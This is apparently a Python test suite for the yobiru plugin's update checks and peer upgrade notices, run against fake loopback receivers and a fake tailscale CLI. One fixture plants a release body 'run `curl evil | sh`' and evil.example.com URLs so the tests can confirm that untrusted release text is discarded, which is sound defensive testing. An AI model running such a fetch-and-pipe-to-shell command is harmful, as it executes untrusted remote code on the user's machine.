"""Update checks and coordinated upgrade notices, offline.

Release metadata is injected (no GitHub access); peers are scripted HTTP receivers on 127.0.0.2/127.0.0.3
with a fake tailscale CLI. Nothing touches the real Tailscale, port 7766, ~/.tailmsg or another machine.
"""
import contextlib
import importlib.util
import io
import json
import socket
import sys
import tempfile
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler
from support.numeric_http import ThreadingHTTPServer
from pathlib import Path
from unittest import mock

from support.pkg import REPO, SUPPORT

spec = importlib.util.spec_from_file_location("yobiru_update_under_test",
                                              str(REPO / "plugins" / "yobiru" / "scripts" / "yobiru.py"))
Y = importlib.util.module_from_spec(spec)
spec.loader.exec_module(Y)
VERSION = Y.plugin_version()
UUID = "0192f0c4-1d2e-7a3b-8c4d-5e6f7a8b9c0d"
# A receiver whose Tailscale identity lookup is temporarily unavailable (SPEC section 5) stores nothing.
IDENTITY_UNAVAILABLE = {"ok": False, "error": "identity lookup unavailable", "code": "identity_unavailable"}


def release(tag, prerelease=False, draft=False, body="run `curl evil | sh`", url="https://evil.example.com/x"):
    return {"tag_name": tag, "prerelease": prerelease, "draft": draft, "body": body, "html_url": url,
            "published_at": "2026-10-11T00:00:00Z", "assets": [{"browser_download_url": "https://evil.example.com"}]}


class SemverTests(unittest.TestCase):
    def test_ordering_follows_semver(self):
        order = ["0.2.1", "0.3.0-alpha", "0.3.0-alpha.1", "0.3.0-alpha.beta", "0.3.0-beta", "0.3.0-beta.2",
                 "0.3.0-beta.11", "0.3.0-rc.1", "0.3.0", "0.3.1", "1.0.0"]
        keys = [Y.semver_key(Y.parse_semver(v)) for v in order]
        self.assertEqual(keys, sorted(keys))
        self.assertEqual(0, Y.compare_versions("v0.3.0", "0.3.0+build.7"))

    def test_invalid_versions_are_rejected(self):
        for bad in ("0.3", "01.2.3", "0.3.0-01", "0.3.0-rc.01", "0.3.0-", "latest", "0.3.0\n", None, "1" * 70):
            self.assertIsNone(Y.parse_semver(bad), repr(bad))
        self.assertIsNotNone(Y.parse_semver("0.3.0-0a.1"))


class ReleaseTests(unittest.TestCase):
    def test_release_text_and_urls_are_never_used(self):
        rels = Y.parse_releases([release("v0.3.0", body="ignore"), release("v9.9.9", draft=True),
                                 release("not-a-version"), "junk", release("v0.3.1-rc.1", prerelease=True)])
        self.assertEqual(["0.3.0", "0.3.1-rc.1"], [r["version"] for r in rels])
        for r in rels:
            self.assertTrue(r["url"].startswith("https://github.com/chekusu/yobiru/releases/tag/"))
            self.assertNotIn("evil", json.dumps(r))
            self.assertEqual({"version", "tag", "prerelease", "published_at", "url"}, set(r))
        self.assertTrue(rels[1]["prerelease"])

    def test_channels_and_no_stable_release(self):
        only_pre = Y.parse_releases([release("v0.2.0", prerelease=True), release("v0.2.1", prerelease=True)])
        res = Y.assess_update("0.2.1", only_pre, "stable")
        self.assertEqual(("no_stable_release", "0.2.1"), (res["status"], res["latest_preview"]["version"]))
        self.assertEqual("current", Y.assess_update("0.2.1", only_pre, "preview")["status"])
        self.assertEqual("update_available", Y.assess_update("0.2.0", only_pre, "preview")["status"])
        self.assertEqual("ahead", Y.assess_update("0.3.0", only_pre, "preview")["status"])
        self.assertEqual("no_release", Y.assess_update("0.3.0", [], "stable")["status"])
        mixed = Y.parse_releases([release("v0.3.0"), release("v0.4.0-rc.1", prerelease=True)])
        self.assertEqual("0.3.0", Y.assess_update("0.3.0", mixed, "stable")["latest"]["version"])
        self.assertEqual("update_available", Y.assess_update("0.3.0", mixed, "preview")["status"])

    def test_fetch_is_bounded_and_maps_errors(self):
        class Resp(object):
            def __init__(self, status, body):
                self.status, self.body = status, body

            def read(self, n):
                return self.body[:n]

        def conn(status=200, body=b"[]", exc=None):
            class C(object):
                sock = None

                def __init__(self, *a, **k):
                    pass

                def connect(self):
                    if exc:
                        raise exc

                def request(self, *a, **k):
                    pass

                def getresponse(self):
                    return Resp(status, body)

                def close(self):
                    pass
            return C
        cases = [(conn(404, b'{"message":"Not Found"}'), "repository_not_found"), (conn(403), "rate_limited"),
                 (conn(500), "http_500"), (conn(200, b"x" * (Y.MAX_RELEASES_BYTES + 5)), "metadata_too_large"),
                 (conn(200, b"{}"), "metadata_invalid"), (conn(exc=socket.timeout()), "timeout"),
                 (conn(exc=ConnectionRefusedError()), "network_unavailable")]
        for c, code in cases:
            with mock.patch.object(Y.http.client, "HTTPSConnection", c):
                with self.assertRaises(Y.UpdateError) as caught:
                    Y.fetch_releases(1.0)
                self.assertEqual(code, caught.exception.code)
        with mock.patch.object(Y.http.client, "HTTPSConnection", conn(200, b"[]")):
            self.assertEqual([], Y.fetch_releases(1.0))              # an empty list is "no release", not an error

    def test_official_release_gate(self):
        rels = lambda t: Y.parse_releases([release("v0.3.0", prerelease=True)])
        self.assertIsNone(Y.official_release("0.3.0", "preview", fetch=rels)[1])
        self.assertIn("prerelease", Y.official_release("0.3.0", "stable", fetch=rels)[1])
        self.assertIn("not a published release", Y.official_release("0.3.1", "preview", fetch=rels)[1])

        def offline(t):
            raise Y.UpdateError("network_unavailable")
        self.assertIn("network_unavailable", Y.official_release("0.3.0", "preview", fetch=offline)[1])


class PrereleaseTests(unittest.TestCase):
    """A Beta next to the stable release (0.6.0-beta.1 and 0.5.3): stable checks never offer it, an explicit
    preview check names its exact tag, archive and checksum file, and its notices carry the opt-in."""
    RELEASES = [release("v0.5.3"), release("v0.6.0-beta.1", prerelease=True), release("v0.5.2")]

    def test_the_stable_channel_never_offers_the_beta(self):
        rels = Y.parse_releases(self.RELEASES)
        res = Y.assess_update("0.5.3", rels, "stable")
        self.assertEqual(("current", "0.5.3", "0.6.0-beta.1"),
                         (res["status"], res["latest"]["version"], res["latest_preview"]["version"]))
        self.assertEqual(("update_available", "0.5.3"),
                         (Y.assess_update("0.5.2", rels, "stable")["status"],
                          Y.assess_update("0.5.2", rels, "stable")["latest"]["version"]))
        unflagged = Y.parse_releases([release("v0.5.3"), release("v0.6.0-beta.1", prerelease=False)])
        self.assertEqual("0.5.3", Y.assess_update("0.5.3", unflagged, "stable")["latest"]["version"],
                         "a SemVer prerelease stays a prerelease whatever the release flag says")

    def test_preview_offers_the_exact_beta_and_a_beta_install_stays_on_its_line(self):
        rels = Y.parse_releases(self.RELEASES)
        res = Y.assess_update("0.5.3", rels, "preview")
        self.assertEqual(("update_available", "0.6.0-beta.1", "v0.6.0-beta.1"),
                         (res["status"], res["latest"]["version"], res["latest"]["tag"]))
        self.assertEqual("ahead", Y.assess_update("0.6.0-beta.1", rels, "stable")["status"])
        self.assertEqual("current", Y.assess_update("0.6.0-beta.1", rels, "preview")["status"])
        final = Y.parse_releases(self.RELEASES + [release("v0.6.0")])
        self.assertEqual("update_available", Y.assess_update("0.6.0-beta.1", final, "stable")["status"])
        # SemVer compares identifiers as text, so a development build of the same version sorts above the beta:
        # such an installation is told it is ahead and is never offered the beta as an update
        self.assertEqual(1, Y.compare_versions("0.6.0-dev.1", "0.6.0-beta.1"))
        self.assertEqual("ahead", Y.assess_update("0.6.0-dev.1", rels, "preview")["status"])

    def test_upgrade_steps_pin_the_prerelease_tag_archive_and_checksum(self):
        rel = Y.parse_releases(self.RELEASES)[1]
        steps = Y.upgrade_steps({}, "0.6.0-beta.1", rel)
        text = " ".join(steps)
        for want in ("never install it", "https://github.com/chekusu/yobiru/releases/tag/v0.6.0-beta.1",
                     "`yobiru-0.6.0-beta.1-plugin.zip` and `SHA256SUMS`",
                     "scripts/yobiru version` prints 0.6.0-beta.1",
                     "`codex plugin marketplace add chekusu/yobiru --ref v0.6.0-beta.1`",
                     "update notify --channel preview"):
            self.assertIn(want, text)
        self.assertNotIn("marketplace upgrade yobiru` then", text, "a branch upgrade would install the stable release")
        stable = " ".join(Y.upgrade_steps({}, "0.5.3"))
        self.assertIn("`codex plugin marketplace upgrade yobiru`", stable)
        self.assertNotIn("--channel preview", stable)
        bridged = Y.upgrade_steps({"codex_bridge_installed": True}, "0.6.0-beta.1", rel)
        self.assertEqual(len(steps) + 1, len(bridged))
        self.assertIn("codex-bridge install", bridged[-3], "the bridge is reinstalled before the final checks")

    def test_a_newer_runtime_is_never_advised_to_be_replaced(self):
        self.assertIn("install-runtime --upgrade --apply", Y.runtime_step("0.6.0-beta.1", "0.5.3"))
        for newer in ("0.6.0-dev.1", "0.6.0", "0.7.0-alpha.1"):
            step = Y.runtime_step("0.6.0-beta.1", newer)
            self.assertIn("keep the durable runtime", step, newer)
            self.assertNotIn("--upgrade --apply", step, newer)

    def test_prerelease_notices_carry_the_opt_in_and_stable_ones_do_not(self):
        rels = Y.parse_releases(self.RELEASES)
        beta = json.loads(Y.notice_text("alpha.example.ts.net", "0.6.0-beta.1", rels[1]))
        self.assertEqual((True, "v0.6.0-beta.1"), (beta["prerelease"], beta["tag"]))
        self.assertIn("an authorization for stable updates does not cover it", beta["opt_in"])
        stable = json.loads(Y.notice_text("alpha.example.ts.net", "0.5.3", rels[0]))
        self.assertFalse({"prerelease", "opt_in"} & set(stable))


def free_shared_port(ips):
    for _ in range(50):
        with socket.socket() as s:
            s.bind(("127.0.0.1", 0))
            port = s.getsockname()[1]
        try:
            for ip in ips:
                with socket.socket() as t:
                    t.bind((ip, port))
            return port
        except OSError:
            continue
    raise unittest.SkipTest("no shared loopback port")


class FakeReceiver(object):
    """Scripted receiver: /health, /info and POST /msg behaviour per test."""

    def __init__(self, ip, port, node, version="0.2.9", info=True, msg="ok", agents=None):
        self.node, self.version, self.info, self.msg = node, version, info, msg
        self.agents = agents if agents is not None else [{"agent": "codex", "default": True, "session": {
            "runtime": "codex", "id": UUID, "id_source": "codex-bridge", "native_name_status": "ok",
            "native_name": "Inbox"}}]
        self.posts = []
        outer = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def send(self, status, obj):
                data = json.dumps(obj).encode()
                self.send_response(status)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self):
                if self.path == "/health":
                    return self.send(200, {"ok": True, "v": 1, "node": outer.node})
                if self.path == "/info" and outer.info == "403":
                    return self.send(403, {"ok": False})
                if self.path == "/info" and outer.info == "503":
                    return self.send(503, IDENTITY_UNAVAILABLE)
                if self.path == "/info" and outer.info:
                    return self.send(200, {"ok": True, "v": 1, "product": "yobiru", "version": outer.version,
                                           "node": outer.node, "agents": outer.agents})
                return self.send(404, {"ok": False, "error": "not found"})

            def do_POST(self):
                env = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                outer.posts.append(env)
                if outer.msg == "ok":
                    return self.send(202, {"ok": True, "id": env["id"]})
                if outer.msg == "noid":
                    return self.send(202, {"ok": True})
                if outer.msg == "403":
                    return self.send(403, {"ok": False, "error": "peer not in allow list"})
                if outer.msg == "400":
                    return self.send(400, {"ok": False, "error": "unknown fields: ['agent']"})
                if outer.msg == "503-identity":
                    return self.send(503, IDENTITY_UNAVAILABLE)
                if outer.msg == "503":
                    return self.send(503, {"ok": False, "error": "service unavailable"})
        self.srv = ThreadingHTTPServer((ip, port), H)
        self.srv.daemon_threads = True
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def close(self):
        self.srv.shutdown()
        self.srv.server_close()


@unittest.skipUnless(sys.platform.startswith("linux"), "uses several 127.0.0.x addresses")
class NotifyTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        root = Path(self.tmp.name)
        self.home = root / "alpha home"
        self.home.mkdir()
        self.port = free_shared_port(["127.0.0.1", "127.0.0.2", "127.0.0.3"])
        self.state_file = root / "ts.json"
        self.peers = {"bravo": {"ip": "127.0.0.2", "online": True}, "charlie": {"ip": "127.0.0.3", "online": True}}
        self.write_status()
        (self.home / "config.json").write_text(json.dumps({
            "port": self.port, "bind": "127.0.0.1", "allow": ["bravo"], "default_agent": "codex",
            "tailscale_cmd": [sys.executable, str(SUPPORT / "fake_tailscale.py"), "--state", str(self.state_file)]}))
        (self.home / "tailmsg.py").write_text('PRODUCT_VERSION = "%s"\n' % VERSION)
        self.me = FakeReceiver("127.0.0.1", self.port, "alpha.example.ts.net", version=VERSION)
        self.addCleanup(self.me.close)
        self.bravo = FakeReceiver("127.0.0.2", self.port, "bravo.example.ts.net")
        self.addCleanup(self.bravo.close)
        self.releases = [release("v" + VERSION, prerelease=True)]

    def write_status(self):
        peer = {}
        for name, p in self.peers.items():
            if p is None:
                continue
            peer[name] = {"DNSName": "%s.example.ts.net." % name, "HostName": name, "TailscaleIPs": [p["ip"]],
                          "Online": p["online"], "OS": "linux"}
        self.state_file.write_text(json.dumps({"status": {
            "BackendState": "Running", "Self": {"DNSName": "alpha.example.ts.net.", "HostName": "alpha",
                                                "TailscaleIPs": ["127.0.0.1"], "Online": True}, "Peer": peer}}))

    def notify(self, *args):
        out = io.StringIO()
        with mock.patch.object(Y, "fetch_releases", lambda t: Y.parse_releases(self.releases)), \
                contextlib.redirect_stdout(out):
            try:
                code = Y.main(["--home", str(self.home), "update", "notify", "--json", "--channel", "preview",
                               "--timeout", "2"] + list(args))
            except SystemExit as e:
                code = e.code
        return code, json.loads(out.getvalue())

    def state(self):
        return json.loads((self.home / "upgrade-notices.json").read_text())

    def entry(self, key_part):
        return [e for k, e in self.state()["notices"].items() if key_part in k][0]

    def test_dry_run_writes_nothing_and_skips_unknown_nodes(self):
        code, res = self.notify()
        self.assertEqual(0, code)
        self.assertTrue(res["verification"]["ok"], res["verification"])
        self.assertEqual(["bravo.example.ts.net:%d/codex@%s" % (self.port, VERSION)], [p["key"] for p in res["plan"]])
        self.assertEqual("send", res["plan"][0]["action"])            # charlie runs no receiver: not messaged
        self.assertFalse((self.home / "upgrade-notices.json").exists())
        self.assertEqual([], self.bravo.posts)

    def test_apply_notifies_once_and_dedups(self):
        code, res = self.notify("--apply")
        self.assertEqual(0, code, res)
        self.assertEqual(1, len(self.bravo.posts))
        env = self.bravo.posts[0]
        self.assertEqual(("yobiru-upgrade-notice", "codex", "bravo.example.ts.net", "now"),
                         (env["kind"], env["agent"], env["to"], env["wake"]))      # receiver policy may lower it
        notice = json.loads(env["text"])
        self.assertEqual((VERSION, "https://github.com/chekusu/yobiru"), (notice["version"], notice["source"]))
        self.assertEqual(("v" + VERSION, "https://github.com/chekusu/yobiru/releases/tag/v" + VERSION),
                         (notice["tag"], notice["release"]))             # the verified release, not a guess
        self.assertNotIn("previous_version", notice)
        self.assertEqual("notified", self.entry("bravo")["status"])
        self.notify("--apply")
        self.assertEqual(1, len(self.bravo.posts))                     # no second message
        self.bravo.version = VERSION                                   # later discovery: software converged
        self.notify("--apply")
        self.assertEqual("verified", self.entry("bravo")["status"])
        self.assertEqual(1, len(self.bravo.posts))

    def test_invalid_receipt_is_uncertain_and_only_reconciled_with_the_same_id(self):
        self.bravo.msg = "noid"
        self.notify("--apply")
        self.assertEqual("uncertain", self.entry("bravo")["status"])
        self.notify("--apply")
        self.assertEqual(1, len(self.bravo.posts))                     # never resent blindly
        self.bravo.msg = "ok"
        self.notify("--apply", "--reconcile-uncertain")
        self.assertEqual(2, len(self.bravo.posts))
        self.assertEqual(self.bravo.posts[0]["id"], self.bravo.posts[1]["id"])
        self.assertEqual(self.bravo.posts[0], self.bravo.posts[1])     # identical envelope: receivers dedupe
        self.assertEqual("now", self.bravo.posts[1]["wake"])
        self.assertEqual("notified", self.entry("bravo")["status"])

    def test_403_and_400_are_definite_and_not_resent(self):
        self.bravo.msg = "403"
        self.notify("--apply")
        self.assertEqual("blocked", self.entry("bravo")["status"])
        self.bravo.msg = "400"
        self.notify("--apply")
        self.assertEqual("rejected", self.entry("bravo")["status"])
        self.notify("--apply")
        self.assertEqual(2, len(self.bravo.posts))

    def test_blocked_legacy_receiver_is_not_asked_again_without_retry(self):
        self.bravo.info = False                                         # older receiver: no /info
        self.bravo.msg = "403"
        self.notify("--apply", "--peer", "bravo/codex")
        self.assertEqual("blocked", self.entry("bravo")["status"])
        for _ in range(2):
            code, res = self.notify("--apply", "--peer", "bravo/codex")
            self.assertEqual("hold", res["plan"][0]["action"])
        self.assertEqual(1, len(self.bravo.posts))                     # no repeated 403s
        self.bravo.msg = "ok"
        self.notify("--apply", "--peer", "bravo/codex", "--retry-blocked")
        self.assertEqual("notified", self.entry("bravo")["status"])
        self.assertEqual(2, len(self.bravo.posts))

    def test_blocked_is_retried_once_info_shows_access_again(self):
        self.bravo.info = "403"
        self.notify("--apply")
        self.assertEqual("blocked", self.entry("bravo")["status"])
        self.bravo.info = True                                          # allow list now includes this machine
        self.notify("--apply")
        self.assertEqual("notified", self.entry("bravo")["status"])
        self.assertEqual(1, len(self.bravo.posts))

    def test_info_403_is_blocked_without_sending(self):
        self.bravo.info = "403"
        self.notify("--apply")
        self.assertEqual("blocked", self.entry("bravo")["status"])
        self.assertEqual([], self.bravo.posts)

    def test_interrupted_dispatch_becomes_uncertain(self):
        self.notify("--apply")
        st = self.state()
        e = next(iter(st["notices"].values()))
        e["status"] = "dispatching"
        (self.home / "upgrade-notices.json").write_text(json.dumps(st))
        self.notify("--apply")
        self.assertEqual("uncertain", self.entry("bravo")["status"])
        self.assertEqual(1, len(self.bravo.posts))

    def test_stale_plan_never_downgrades_uncertain(self):
        f = Y.gather_versions(self.home, "--home")
        nodes, _ = Y.tailnet_nodes(f["cfg"]["tailscale_cmd"])
        self.peers["bravo"]["online"] = False
        self.write_status()
        nodes_off, _ = Y.tailnet_nodes(f["cfg"]["tailscale_cmd"])
        state = Y.load_notice_state(self.home)
        items, _ = Y.notice_candidates(state, nodes_off, [("bravo", self.port, "codex")], self.port, True, VERSION)
        probes = [None for _ in items]
        planned = Y.notice_plan(state, items, probes, VERSION, False)
        self.assertEqual("pending", planned[0]["action"])
        key = planned[0]["key"]                                        # meanwhile another run recorded uncertain
        Y.write_json_atomic(self.home / "upgrade-notices.json", {"v": 1, "installations": {}, "notices": {key: {
            "key": key, "node": "bravo.example.ts.net", "port": self.port, "agent": "codex", "version": VERSION,
            "status": "uncertain", "envelope": {"id": "abcdef0123456789"}}}})
        posted = []
        Y.apply_notices(self.home, "alpha.example.ts.net", VERSION, items, probes, False,
                        post=lambda *a: posted.append(a) or ("notified", "", 202))
        self.assertEqual("uncertain", self.entry("bravo")["status"])
        self.assertEqual([], posted)

    def test_explicit_offline_peer_is_kept_and_planned_later(self):
        self.peers["bravo"]["online"] = False
        self.write_status()
        code, res = self.notify("--apply", "--no-discover", "--peer", "bravo/codex")
        self.assertEqual(0, code, res)
        self.assertEqual("pending", self.entry("bravo")["status"])
        self.assertIn("bravo.example.ts.net:%d" % self.port, self.state()["installations"])
        code, res = self.notify("--no-discover")
        self.assertEqual(["pending"], [p["action"] for p in res["plan"]])
        self.peers["bravo"] = None                                    # gone from tailscale status entirely
        self.write_status()
        code, res = self.notify("--apply", "--no-discover")
        self.assertEqual(["pending"], [p["action"] for p in res["plan"]])
        self.assertIn("not in the current tailscale status", res["plan"][0]["why"])
        self.assertEqual([], self.bravo.posts)                         # no fabricated address is ever used
        self.peers["bravo"] = {"ip": "127.0.0.2", "online": True}
        self.write_status()
        self.notify("--apply", "--no-discover")
        self.assertEqual("notified", self.entry("bravo")["status"])
        self.assertEqual("codex", self.bravo.posts[0]["agent"])

    def test_legacy_receiver_keeps_the_explicit_agent(self):
        self.bravo.info = False                                         # 404 on /info: an older receiver
        self.notify("--apply", "--peer", "bravo/helper")
        self.assertEqual("helper", self.bravo.posts[0]["agent"])       # never dropped or retargeted
        self.assertEqual("notified", self.entry("helper")["status"])

    def test_unprefixed_official_tag_is_used_as_published(self):
        self.releases = [release(VERSION, prerelease=True)]
        self.notify("--apply")
        notice = json.loads(self.bravo.posts[0]["text"])
        self.assertEqual((VERSION, "https://github.com/chekusu/yobiru/releases/tag/" + VERSION),
                         (notice["tag"], notice["release"]))

    def test_unpublished_or_unverified_targets_are_refused(self):
        self.releases = []
        code, res = self.notify("--apply")
        self.assertEqual(1, code)
        self.assertIn("not a published release", res["error"])
        self.releases = [release("v" + VERSION, prerelease=True)]
        out = io.StringIO()
        with mock.patch.object(Y, "fetch_releases", lambda t: Y.parse_releases(self.releases)), \
                contextlib.redirect_stdout(out):
            code = Y.main(["--home", str(self.home), "update", "notify", "--json", "--apply"])
        self.assertIn("prerelease", json.loads(out.getvalue())["error"])
        self.me.version = "0.2.9"                                       # running receiver not restarted yet
        code, res = self.notify("--apply")
        self.assertEqual(1, code)
        self.assertIn("running receiver", " ".join(res["verification"]["problems"]))
        self.assertEqual([], self.bravo.posts)
        self.assertFalse((self.home / "upgrade-notices.json").exists())

    def test_concurrent_run_is_refused(self):
        with Y.StateLock(self.home / ".upgrade-notices.lock"):
            code, res = self.notify("--apply")
        self.assertEqual(1, code)
        self.assertIn("another yobiru process", res["error"])
        self.assertEqual([], self.bravo.posts)

    def test_connection_refused_is_known_unsent(self):
        self.bravo.close()
        code, res = self.notify("--apply", "--peer", "bravo/codex")
        self.assertEqual("pending", self.entry("bravo")["status"])

    def test_identity_unavailable_503_is_unsent_and_the_same_envelope_is_sent_later(self):
        self.bravo.msg = "503-identity"
        self.notify("--apply")
        entry = self.entry("bravo")
        self.assertEqual("pending", entry["status"], "a documented 503 before storage is not an uncertain delivery")
        self.assertIn("could not verify this machine's identity", entry["last_error"])
        self.assertEqual(1, len(self.bravo.posts))
        self.bravo.msg = "ok"
        self.notify("--apply")
        self.assertEqual("notified", self.entry("bravo")["status"])
        self.assertEqual(2, len(self.bravo.posts))
        self.assertEqual(self.bravo.posts[0], self.bravo.posts[1], "the retry reuses the identical stored envelope")

    def test_other_503_answers_stay_uncertain(self):
        self.bravo.msg = "503"
        self.notify("--apply")
        self.assertEqual("uncertain", self.entry("bravo")["status"])
        self.notify("--apply")
        self.assertEqual(1, len(self.bravo.posts), "an uncertain notice is never resent automatically")

    def test_info_identity_unavailable_is_reported_and_kept_pending(self):
        self.bravo.info = "503"
        code, res = self.notify("--peer", "bravo/codex")          # discovery alone never targets an erroring node
        self.assertEqual(("pending", "error"), (res["plan"][0]["action"], res["plan"][0]["receiver"]))
        probe = Y.probe_info("127.0.0.2", self.port, 2, host="bravo.example.ts.net")
        self.assertEqual(503, probe["http_status"])
        self.assertIn("could not verify this machine's identity", probe["error"])


@unittest.skipUnless(sys.platform.startswith("linux"), "uses several loopback addresses")
class MaintenanceTests(unittest.TestCase):
    setUp = NotifyTests.setUp
    write_status = NotifyTests.write_status
    notify = NotifyTests.notify
    state = NotifyTests.state
    entry = NotifyTests.entry

    def maintain(self, *args):
        out = io.StringIO()
        with mock.patch.object(Y, "fetch_releases", lambda t: Y.parse_releases(self.releases)), \
                contextlib.redirect_stdout(out):
            code = Y.main(["--home", str(self.home), "update", "maintain", "--json", "--channel", "preview",
                           "--timeout", "1"] + list(args))
        return code, json.loads(out.getvalue())

    def queue_offline(self):
        self.peers["bravo"]["online"] = False
        self.write_status()
        self.notify("--apply", "--no-discover", "--peer", "bravo/codex")
        self.assertEqual("pending", self.entry("bravo")["status"])

    def test_dry_run_does_not_write_or_send(self):
        self.queue_offline()
        before = {p.name: p.read_bytes() for p in self.home.iterdir() if p.is_file()}
        code, res = self.maintain()
        self.assertEqual(0, code, res)
        self.assertEqual(before, {p.name: p.read_bytes() for p in self.home.iterdir() if p.is_file()})
        self.assertEqual([], self.bravo.posts)

    def test_restart_and_online_recovery_only_retries_saved_recipients(self):
        self.queue_offline()
        code, _ = self.maintain("--apply")
        self.assertEqual(0, code)
        self.peers["bravo"]["online"] = True
        self.write_status()
        stranger = FakeReceiver("127.0.0.3", self.port, "charlie.example.ts.net")
        self.addCleanup(stranger.close)
        # Simulate another invocation: nothing needed from the previous process's memory.
        code, res = self.maintain("--apply")
        self.assertEqual(0, code, res)
        self.assertEqual("notified", self.entry("bravo")["status"])
        self.assertEqual(1, len(self.bravo.posts))
        self.assertEqual([], stranger.posts)
        self.maintain("--apply")
        self.assertEqual(1, len(self.bravo.posts))
        self.bravo.version = VERSION
        self.maintain("--apply")
        self.assertEqual("verified", self.entry("bravo")["status"])

    def test_new_remote_session_is_not_automatically_enrolled(self):
        self.queue_offline()
        self.peers["bravo"]["online"] = True
        self.write_status()
        self.bravo.agents.append({"agent": "new-agent", "default": False, "session": {
            "runtime": "codex", "id": UUID, "id_source": "binding", "native_name_status": "unsupported"}})
        self.maintain("--apply")
        self.assertEqual(["codex"], [p.get("agent") for p in self.bravo.posts])
        self.assertEqual(1, len(self.state()["notices"]))

    def test_uncertain_never_retries_and_stays_visible(self):
        self.bravo.msg = "noid"
        self.notify("--apply")
        self.bravo.msg = "ok"
        code, res = self.maintain("--apply")
        self.assertEqual(0, code, res)
        self.assertEqual("uncertain", self.entry("bravo")["status"])
        self.assertEqual(1, len(self.bravo.posts))
        self.assertEqual("hold", res["plans"][0]["plan"][0]["action"])

    def test_known_unsent_retry_reuses_stored_envelope(self):
        with mock.patch.object(Y, "post_notice", return_value=("not_sent", "connection refused", None)):
            self.notify("--apply")
        envelope = self.entry("bravo")["envelope"]
        self.maintain("--apply")
        self.assertEqual(envelope, self.bravo.posts[0])

    def test_blocked_peer_recovers_when_access_policy_allows(self):
        self.bravo.info = "403"
        self.notify("--apply")
        self.maintain("--apply")
        self.assertEqual([], self.bravo.posts)
        self.bravo.info = True
        self.maintain("--apply")
        self.assertEqual(1, len(self.bravo.posts))

    def test_newer_local_version_can_finish_an_old_queued_notice(self):
        self.queue_offline()
        old = VERSION
        newer = "9.0.0"
        self.me.version = newer
        (self.home / "tailmsg.py").write_text('PRODUCT_VERSION = "9.0.0"\n')
        self.peers["bravo"]["online"] = True
        self.write_status()
        self.releases.append(release("v" + newer))
        with mock.patch.object(Y, "plugin_version", return_value=newer):
            code, res = self.maintain("--apply")
        self.assertEqual(0, code, res)
        self.assertEqual(old, json.loads(self.bravo.posts[0]["text"])["version"])

    def test_a_stable_run_holds_a_queued_prerelease_notice_and_says_why(self):
        beta = "9.1.0-beta.1"
        self.me.version = beta
        (self.home / "tailmsg.py").write_text('PRODUCT_VERSION = "%s"\n' % beta)
        self.releases = [release("v9.0.0"), release("v" + beta, prerelease=True)]
        with mock.patch.object(Y, "plugin_version", return_value=beta):
            self.peers["bravo"]["online"] = False
            self.write_status()
            self.notify("--apply", "--no-discover", "--peer", "bravo/codex", "--version", beta)
            self.assertEqual("pending", self.entry("bravo")["status"])
            self.peers["bravo"]["online"] = True
            self.write_status()
            code, res = self.maintain("--apply", "--channel", "stable")      # e.g. a timer made for stable
            self.assertEqual(1, code, res)
            self.assertEqual([], self.bravo.posts)
            self.assertEqual("pending", self.entry("bravo")["status"])
            self.assertIn("update maintain --channel preview", res["plans"][0]["held"])
            self.assertEqual(1, len([e for e in res["errors"] if "is a prerelease" in e]))
            code, res = self.maintain("--apply")                              # --channel preview
            self.assertEqual(0, code, res)
            self.assertIsNone(res["plans"][0]["held"])
        self.assertEqual("notified", self.entry("bravo")["status"])
        self.assertTrue(json.loads(self.bravo.posts[0]["text"])["prerelease"])

    def test_no_saved_notices_does_not_announce_to_any_peer(self):
        code, res = self.maintain("--apply")
        self.assertEqual(0, code, res)
        self.assertEqual([], self.bravo.posts)
        self.assertFalse((self.home / "upgrade-notices.json").exists())
        self.assertTrue((self.home / "update-check.json").exists())

    def test_cache_limits_network_and_invalid_or_stale_cache_is_refreshed(self):
        fetch = mock.Mock(return_value=Y.parse_releases(self.releases))
        first = Y.maintenance_releases(self.home, True, 1, fetch)
        second = Y.maintenance_releases(self.home, True, 1, fetch)
        self.assertFalse(first[2])
        self.assertTrue(second[2])
        self.assertEqual(1, fetch.call_count)
        path = self.home / "maintenance-releases.json"
        cache = json.loads(path.read_text())
        cache["checked_at"] = "2020-01-01T00:00:00Z"
        path.write_text(json.dumps(cache))
        self.assertFalse(Y.maintenance_releases(self.home, True, 1, fetch)[2])
        self.assertEqual(2, fetch.call_count)

    def test_parallel_maintenance_is_refused(self):
        with Y.StateLock(self.home / ".upgrade-maintenance.lock"):
            code, res = self.maintain("--apply")
        self.assertEqual(1, code)
        self.assertIn("another yobiru process", res["errors"][0])
        self.assertEqual([], self.bravo.posts)

    def test_notice_removed_after_plan_is_not_recreated_or_sent(self):
        self.queue_offline()
        f = Y.gather_versions(self.home, "--home")
        nodes, _ = Y.tailnet_nodes(f["cfg"]["tailscale_cmd"])
        items, keys = Y.maintenance_candidates(self.state(), nodes, VERSION)
        for c in items:
            c.update(online=True, ip="127.0.0.2")
        probes = [Y.probe_info("127.0.0.2", self.port, 1, expect_node="bravo.example.ts.net")]
        state = self.state()
        state["notices"] = {}       # another local operation cancels it between plan and apply
        Y.write_json_atomic(self.home / "upgrade-notices.json", state)
        Y.apply_notices(self.home, "alpha.example.ts.net", VERSION, items, probes, False, notice_keys=keys)
        self.assertEqual({}, self.state()["notices"])
        self.assertEqual([], self.bravo.posts)

    def test_unknown_status_and_missing_uncertain_envelope_never_create_a_send(self):
        self.notify("--apply")
        for status in ("corrupt", "uncertain"):
            state = self.state()
            entry = next(iter(state["notices"].values()))
            entry["status"] = status
            entry.pop("envelope", None)
            Y.write_json_atomic(self.home / "upgrade-notices.json", state)
            self.notify("--apply", "--reconcile-uncertain")
        self.assertEqual(1, len(self.bravo.posts))
        self.assertEqual("uncertain", self.entry("bravo")["status"])
        self.assertIn("stored envelope", self.entry("bravo")["last_error"])

    def test_existing_missing_status_is_not_treated_as_new_authorization(self):
        self.notify("--apply")
        state = self.state()
        entry = next(iter(state["notices"].values()))
        entry.pop("status")
        entry.pop("envelope")
        Y.write_json_atomic(self.home / "upgrade-notices.json", state)
        self.maintain("--apply")
        self.assertEqual(1, len(self.bravo.posts))
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = Y.main(["--home", str(self.home), "update", "status", "--json"])
        self.assertEqual(0, code)
